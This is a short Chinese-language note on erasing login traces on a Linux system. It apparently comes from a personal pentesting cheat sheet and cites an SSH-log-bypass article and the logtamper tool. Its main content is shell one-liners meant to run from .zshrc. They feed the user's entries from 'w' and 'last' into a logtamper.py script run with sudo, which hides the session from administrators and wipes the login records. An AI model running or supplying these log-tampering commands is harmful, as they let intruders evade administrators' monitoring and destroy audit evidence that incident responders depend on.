# 日志

## 抹除登录痕迹

```shell
## 可放在 .zshrc 中执行
# 躲避管理员 w 查看
w    | grep kyo | perl -F'\s+' -lanE'print $F[2]' | uniq | xargs -r -l sudo python /home/kyo/bin/logtamper.py -m 1 -u kyo -i
# 清除登录日志
last | grep kyo | perl -F'\s+' -lanE'print $F[2]' | uniq | xargs -r -l sudo python /home/kyo/bin/logtamper.py -m 2 -u kyo -i

```

### Refs
* [渗透基础——SSH日志的绕过](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-SSH%E6%97%A5%E5%BF%97%E7%9A%84%E7%BB%95%E8%BF%87/)
* [AV1080p/logtamper](https://github.com/AV1080p/logtamper)